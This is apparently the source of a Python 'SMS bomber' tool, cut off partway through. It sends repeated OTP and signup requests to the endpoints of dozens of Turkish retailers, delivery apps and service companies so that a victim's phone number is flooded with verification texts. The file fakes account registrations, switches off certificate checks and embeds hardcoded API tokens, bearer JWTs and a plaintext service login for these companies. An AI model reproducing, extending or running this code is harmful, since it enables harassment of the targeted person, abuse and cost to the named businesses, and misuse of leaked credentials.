# ============================================================
# CYBER - SMSBOMBER v1.0.0
# Enough-Reborn tabanlı, 90+ Türk servisi
# Normal / Turbo mod
# ============================================================

import subprocess, sys, os
import concurrent.futures, json, random, string, time, urllib, uuid
from time import sleep
from os import system
from concurrent.futures import ThreadPoolExecutor, wait
from random import choice
from string import ascii_lowercase
import math
import ssl
import urllib.request
import urllib.error
import threading

class R:
    K="\033[91m"; Y="\033[92m"; S="\033[93m"; M="\033[94m"
    MO="\033[95m"; C="\033[96m"; B="\033[97m"; SF="\033[0m"; KA="\033[1m"

def temizle():
    os.system("clear" if os.name != "nt" else "cls")

def ssl_ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c

def http_istek(url, method="POST", headers=None, data=None, json_data=None, timeout=6):
    """requests kütüphanesini taklit eden basit HTTP isteği."""
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"}
    if headers:
        h.update(headers)
    body = None
    if json_data is not None:
        body = json.dumps(json_data).encode("utf-8")
        h.setdefault("Content-Type", "application/json")
    elif data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode("utf-8")
        elif isinstance(data, str):
            body = data.encode("utf-8")
        else:
            body = data
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
    try:
        req = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx()) as y:
            return _Cevap(y.status, y.read().decode("utf-8", errors="ignore"))
    except urllib.error.HTTPError as e:
        try:
            icerik = e.read().decode("utf-8", errors="ignore")
        except Exception:
            icerik = ""
        return _Cevap(e.code, icerik)
    except Exception:
        return _Cevap(0, "")

class _Cevap:
    def __init__(self, status, text):
        self.status_code = status
        self.text = text
    def json(self):
        return json.loads(self.text)

def _post(url, **kw):
    return http_istek(url, method="POST", **kw)

def _get(url, **kw):
    return http_istek(url, method="GET", **kw)

class SendSms():
    adet = 0
    kilit = threading.Lock()

    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(20)) + "@gmail.com"

    def _basari(self, ad):
        with SendSms.kilit:
            self.adet += 1
        print(f"{R.Y}[+] {R.SF}Başarılı! {self.phone} --> {ad}")
        return True

    def _hata(self, ad):
        print(f"{R.K}[-] {R.SF}Başarısız! {self.phone} --> {ad}")
        return False

    # --- Türk servisleri ---
    def KahveDunyasi(self):
        try:
            r = _post("https://core.kahvedunyasi.com/api/users/sms/send",
                      headers={"Content-Type": "application/json", "Positive-Client": "kahvedunyasi",
                               "Store-Id": "1", "Origin": "https://www.kahvedunyasi.com",
                               "Referer": "https://www.kahvedunyasi.com/"},
                      json_data={"mobile_number": self.phone, "token_type": "register_token"})
            if r.status_code == 200: return self._basari("kahvedunyasi.com")
            raise
        except: return self._hata("kahvedunyasi.com")

    def Wmf(self):
        try:
            r = _post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail,
                "email_allowed": "true", "first_name": "Memati", "gender": "male",
                "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"})
            if r.status_code == 202: return self._basari("wmf.com.tr")
            raise
        except: return self._hata("wmf.com.tr")

    def Bim(self):
        try:
            r = _post("https://bim.veesk.net/service/v1.0/account/login", json_data={"phone": self.phone})
            if r.status_code == 200: return self._basari("bim.veesk.net")
            raise
        except: return self._hata("bim.veesk.net")

    def Englishhome(self):
        try:
            r = _post("https://www.englishhome.com/api/member/sendOtp",
                      headers={"Content-Type": "application/json", "Origin": "https://www.englishhome.com",
                               "Referer": "https://www.englishhome.com/"},
                      json_data={"Phone": "+90" + self.phone})
            if r.json().get("isError") == False: return self._basari("englishhome.com")
            raise
        except: return self._hata("englishhome.com")

    def Icq(self):
        try:
            url = f"https://u.icq.net/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            r = _post(url, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r.json()["response"]["statusCode"] == 200: return self._basari("u.icq.net")
            raise
        except: return self._hata("u.icq.net")

    def Suiste(self):
        try:
            r = _post("https://suiste.com/api/auth/code",
                      headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                               "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC"},
                      data={"action": "register", "gsm": self.phone})
            if r.json()["code"] == "common.success": return self._basari("suiste.com")
            raise
        except: return self._hata("suiste.com")

    def KimGb(self):
        try:
            r = _post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp",
                      json_data={"msisdn": f"90{self.phone}"})
            if r.status_code == 200: return self._basari("3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            raise
        except: return self._hata("3uptzlakwi.execute-api.eu-west-1.amazonaws.com")

    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Content-Type": "application/json;charset=utf-8",
                       "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            r = _post(url, headers=headers, json_data={"cep_tel": self.phone, "cep_tel_ulkekod": "90"})
            if r.json()["kod"] == "0000": return self._basari("mobileapiv2.tazi.tech")
            raise
        except: return self._hata("mobileapiv2.tazi.tech")

    def Evidea(self):
        try:
            url = "https://www.evidea.com/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
                       "X-Project-Name": "undefined", "X-App-Type": "akinon-mobile",
                       "X-Requested-With": "XMLHttpRequest", "X-App-Device": "ios",
                       "Referer": "https://www.evidea.com/"}
            data = (f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="last_name"\r\n\r\nBas\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="email"\r\n\r\n{self.mail}\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="phone"\r\n\r\n0{self.phone}\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\n"
                    f'content-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n'
                    f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n")
            r = _post(url, headers=headers, data=data)
            if r.status_code == 202: return self._basari("evidea.com")
            raise
        except: return self._hata("evidea.com")

    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            r = _post(url)
            if r.json()["IsSuccess"] == True: return self._basari("heyapi.heymobility.tech")
            raise
        except: return self._hata("heyapi.heymobility.tech")

    def Bisu(self):
        try:
            url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                       "X-Device-Platform": "IOS", "X-Build-Version-Name": "9.4.0",
                       "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e",
                       "X-Build-Version-Code": "22", "X-Device-Manufacturer": "Apple",
                       "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5"}
            r = _post(url, headers=headers, data={"phoneNumber": self.phone})
            if r.json().get("errors") == None: return self._basari("bisu.com.tr")
            raise
        except: return self._hata("bisu.com.tr")

    def Macro(self):
        try:
            url = "https://www.macrocenter.com.tr/rest/users/register/otp?reid=31"
            headers = {"Content-Type": "application/json", "X-Forwarded-Rest": "true",
                       "X-Pwa": "true", "X-Device-Pwa": "true", "Origin": "https://www.macrocenter.com.tr",
                       "Referer": "https://www.macrocenter.com.tr/kayit"}
            r = _post(url, headers=headers, json_data={"email": self.mail, "phoneNumber": self.phone})
            if r.json()["successful"] == True: return self._basari("macrocenter.com.tr")
            raise
        except: return self._hata("macrocenter.com.tr")

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0",
                       "Appversion": "2.4.1", "X-No-Auth": "true", "X-Device-Type": "2"}
            body = {"operationName": "GENERATE_OTP",
                    "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                    "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                                  "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                                  "phone": f"+90{self.phone}"}}
            r = _post(url, headers=headers, json_data=body)
            if r.json()["data"]["generateOtp"] == True: return self._basari("svc.apps.tiklagelsin.com")
            raise
        except: return self._hata("svc.apps.tiklagelsin.com")

    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
                       "Devicetype": "mobileapp"}
            r = _post(url, headers=headers)
            if r.json()["Success"] == True: return self._basari("api.altinyildizclassics.com")
            raise
        except: return self._hata("api.altinyildizclassics.com")

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Content-Type": "application/json; charset=utf-8", "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
                       "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Platform": "ios",
                       "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
                       "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180"}
            r = _post(url, headers=headers, json_data={"telephone": f"+90{self.phone}", "type": "register"})
            if r.status_code == 200: return self._basari("api.naosstars.com")
            raise
        except: return self._hata("api.naosstars.com")

    def Istegelsin(self):
        try:
            url = "https://prod.fasapi.net/"
            headers = {"Content-Type": "application/x-www-form-urlencoded", "App-Version": "2528", "Platform": "IOS"}
            body = {"operationName": "SendOtp2",
                    "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}",
                    "variables": {"phoneNumber": f"90{self.phone}"}}
            r = _post(url, headers=headers, json_data=body)
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False: return self._basari("prod.fasapi.net")
            raise
        except: return self._hata("prod.fasapi.net")

    def Koton(self):
        try:
            url = "https://www.koton.com/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
                       "X-Project-Name": "rn-env", "X-App-Type": "akinon-mobile", "X-App-Device": "ios",
                       "Referer": "https://www.koton.com/"}
            data = (f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\n"
                    f'content-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n'
                    f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\n"
                    f'content-disposition: form-data; name="last_name"\r\n\r\nBas\r\n'
                    f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\n"
                    f'content-disposition: form-data; name="email"\r\n\r\n{self.mail}\r\n'
                    f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\n"
                    f'content-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n'
                    f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\n"
                    f'content-disposition: form-data; name="phone"\r\n\r\n0{self.phone}\r\n'
                    f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\n"
                    f'content-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n'
                    f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n")
            r = _post(url, headers=headers, data=data)
            if r.status_code == 202: return self._basari("koton.com")
            raise
        except: return self._hata("koton.com")

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                       "Referer": "https://www.hayatsu.com.tr/", "Origin": "https://www.hayatsu.com.tr",
                       "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM"}
            r = _post(url, headers=headers, data={"mobilePhoneNumber": self.phone, "actionType": "register"})
            if r.json().get("is_success") == True: return self._basari("api.hayatsu.com.tr")
            raise
        except: return self._hata("api.hayatsu.com.tr")

    def Hizliecza(self):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
            headers = {"Content-Type": "application/json", "Authorization": "Bearer null"}
            r = _post(url, headers=headers, json_data={"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"})
            if r.json().get("isSuccess") == True: return self._basari("hizlieczaprodapi.hizliecza.net")
            raise
        except: return self._hata("hizlieczaprodapi.hizliecza.net")

    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            headers = {"Content-Type": "application/json", "App-Version": "1.3.9",
                       "App-Lang": "en", "App-Name": "ipragaz-mobile", "Os": "ios",
                       "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8"}
            body = {"birthDate": "2/7/2000", "carPlate": "31 ABC 31",
                    "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63",
                    "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""}
            r = _post(url, headers=headers, json_data=body)
            if r.status_code == 200: return self._basari("ipapp.ipragaz.com.tr")
            raise
        except: return self._hata("ipapp.ipragaz.com.tr")

    def Metro(self):
        try:
            url = "https://feature.metro-tr.com/api/mobileAuth/validateSmsSend"
            headers = {"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.1.1",
                       "Applicationplatform": "2"}
            r = _post(url, headers=headers, json_data={"methodType": "2", "mobilePhoneNumber": f"+90{self.phone}"})
            if r.json().get("status") == "success": return self._basari("feature.metro-tr.com")
            raise
        except: return self._hata("feature.metro-tr.com")

    def Qumpara(self):
        try:
            url = "https://tr-api.fisicek.com/v1.3/auth/getOTP"
            headers = {"Content-Type": "application/json"}
            r = _post(url, headers=headers, json_data={"msisdn": f"+90{self.phone}"})
            if r.status_code == 200: return self._basari("tr-api.fisicek.com")
            raise
        except: return self._hata("tr-api.fisicek.com")

    def Paybol(self):
        try:
            url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Content-Type": "application/json"}
            r = _post(url, headers=headers, json_data={"phone_number": f"90{self.phone}"})
            if r.json().get("status") == 0: return self._basari("pyb-mobileapi.walletgate.io")
            raise
        except: return self._hata("pyb-mobileapi.walletgate.io")

    def Migros(self):
        try:
            url = "https://rest.migros.com.tr/sanalmarket/users/register/otp"
            headers = {"Content-Type": "application/json", "X-Device-Type": "MOBILE",
                       "X-Device-App-Version": "10.6.13", "X-Device-Platform": "IOS",
                       "X-Device-Identifier": "31CAAD3F-5B53-315B-9C6D-31310D86826C"}
            r = _post(url, headers=headers, json_data={"email": self.mail, "phoneNumber": self.phone})
            if r.json().get("successful") == True: return self._basari("rest.migros.com.tr")
            raise
        except: return self._hata("rest.migros.com.tr")

    def File(self):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            headers = {"Content-Type": "application/json", "X-Os": "IOS", "X-Version": "1.7"}
            r = _post(url, headers=headers, json_data={"mobilePhoneNumber": f"90{self.phone}"})
            if r.json().get("responseType") == "SUCCESS": return self._basari("api.filemarket.com.tr")
            raise
        except: return self._hata("api.filemarket.com.tr")

    def Joker(self):
        try:
            url = "https://api.joker.com.tr/api/register"
            headers = {"Content-Type": "application/json",
                       "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4F5qftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds"}
            body = {"firstName": "Memati", "gender": "m", "iosVersion": "4.0.2", "lastName": "Bas",
                    "os": "IOS", "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
            r = _post(url, headers=headers, json_data=body)
            if r.json().get("message") == "Doğrulama kodu gönderildi.": return self._basari("api.joker.com.tr")
            raise
        except: return self._hata("api.joker.com.tr")

    def Akasya(self):
        try:
            url = "https://akasya-admin.poilabs.com/v1/tr/sms"
            headers = {"Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya"}
            r = _post(url, headers=headers, json_data={"phone": self.phone})
            if r.json().get("result") == "SMS sended succesfully!": return self._basari("akasya-admin.poilabs.com")
            raise
        except: return self._hata("akasya-admin.poilabs.com")

    def Akbati(self):
        try:
            url = "https://akbati-admin.poilabs.com/v1/tr/sms"
            headers = {"Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akbat"}
            r = _post(url, headers=headers, json_data={"phone": self.phone})
            if r.json().get("result") == "SMS sended succesfully!": return self._basari("akbati-admin.poilabs.com")
            raise
        except: return self._hata("akbati-admin.poilabs.com")

    def Clickme(self):
        try:
            url = "https://mobile-gateway.clickmelive.com/api/v2/authorization/code"
            headers = {"Content-Type": "application/json",
                       "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc",
                       "Client-Version": "1.4.0", "Client-Device": "IOS"}
            r = _post(url, headers=headers, json_data={"phone": self.phone})
            if r.json().get("isSuccess") == True: return self._basari("mobile-gateway.clickmelive.com")
            raise
        except: return self._hata("mobile-gateway.clickmelive.com")

    def Happy(self):
        try:
            url = "https://www.happy.com.tr/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                       "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.happy.com.tr",
                       "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
            r = _post(url, headers=headers, data={"telephone": self.phone})
            if r.status_code == 200: return self._basari("happy.com.tr")
            raise
        except: return self._hata("happy.com.tr")

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = _post(url, headers=headers, json_data={"Telefon": self.phone, "FirmaId": "32"})
            if r.json().get("Success") == True: return self._basari("gateway.komagene.com.tr")
            raise
        except: return self._hata("gateway.komagene.com.tr")

    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com/tr/api/users/registerMessage/"
            r = _post(url, json_data={"phoneNumber": self.phone, "phone_country_code": "+90"})
            if r.status_code == 200: return self._basari("api.kuryemgelsin.com")
            raise
        except: return self._hata("api.kuryemgelsin.com")

    def Porty(self):
        try:
            url = "https://panel.porty.tech/api.php?"
            headers = {"Content-Type": "application/json; charset=UTF-8", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            r = _post(url, headers=headers, json_data={"job": "start_login", "phone": self.phone})
            if r.json().get("status") == "success": return self._basari("panel.porty.tech")
            raise
        except: return self._hata("panel.porty.tech")

    def Taksim(self):
        try:
            url = "https://service.taksim.digital/services/PassengerRegister/Register"
            headers = {"Content-Type": "application/json; charset=utf-8", "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}
            r = _post(url, headers=headers, json_data={"countryPhoneCode": "+90", "name": "Memati", "phoneNo": self.phone, "surname": "Bas"})
            if r.json().get("success") == True: return self._basari("service.taksim.digital")
            raise
        except: return self._hata("service.taksim.digital")

    def Tasdelen(self):
        try:
            url = "http://94.102.66.162/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
            body = {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1", "UserName": "MobilOperator"}}
            r = _post(url, json_data=body)
            if r.json().get("Result") == True: return self._basari("94.102.66.162")
            raise
        except: return self._hata("94.102.66.162")

    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            r = _post(url, json_data={"phone": self.phone, "lang": "tr"})
            if r.status_code == 200: return self._basari("server.tasimacim.com")
            raise
        except: return self._hata("server.tasimacim.com")

    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms"
            headers = {"Content-Type": "application/json"}
            r = _post(url, headers=headers, json_data={"phone_number": self.phone})
            if r.status_code == 200: return self._basari("api.uysalmarket.com.tr")
            raise
        except: return self._hata("api.uysalmarket.com.tr")

    def Yapp(self):
        try:
            url = "https://yapp.com.tr/api/mobile/v1/register"
            body = {"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "",
                    "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati",
                    "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas",
                    "phone_number": self.phone, "sms_code": ""}
            r = _post(url, json_data=body)
            if r.status_code == 200: return self._basari("yapp.com.tr")
            raise
        except: return self._hata("yapp.com.tr")

    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            r = _post(url, json_data={"phone": self.phone, "kvkk": True})
            if r.json().get("success") == True: return self._basari("api.yuffi.co")
            raise
        except: return self._hata("api.yuffi.co")

    def Beefull(self):
        try:
            url1 = "https://app.beefull.io/api/inavitas-access-management/signup"
            _post(url1, json_data={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas",
                                    "password": "123456", "phoneCode": "90", "phoneNumber": self.phone,
                                    "tenant": "beefull", "username": self.mail}, timeout=4)
            url2 = "https://app.beefull.io/api/inavitas-access-management/sms-login"
            r = _post(url2, json_data={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}, timeout=4)
            if r.status_code == 200: return self._basari("app.beefull.io")
            raise
        except: return self._hata("app.beefull.io")

    def Starbucks(self):
        try:
            url = "https://auth.sbuxtr.com/signUp"
            headers = {"Content-Type": "application/json", "Operationchannel": "ios"}
            body = {"allowEmail": True, "allowSms": True, "deviceId": "31", "email": self.mail,
                    "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31",
                    "phoneNumber": self.mail, "preferredName": "Memati"}
            r = _post(url, headers=headers, json_data=body)
            if r.json().get("code") == 50: return self._basari("auth.sbuxtr.com")
            raise
        except: return self._hata("auth.sbuxtr.com")

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8",
                       "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg",
                       "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8",
                       "Appversion": "IOS-7.1.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            r = _post(url, headers=headers, json_data={"email": self.mail, "isSure": False, "mobilePhone": self.phone})
            if r.json().get("isSuccess") == True: return self._basari("frontend.dominos.com.tr")
            raise
        except: return self._hata("frontend.dominos.com.tr")

    def Baydoner(self):
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            headers = {"Content-Type": "application/json", "Platform": "1"}
            body = {"AppVersion": "1.3.2", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "",
                    "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1",
                    "Email": self.mail, "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1,
                    "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati",
                    "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS",
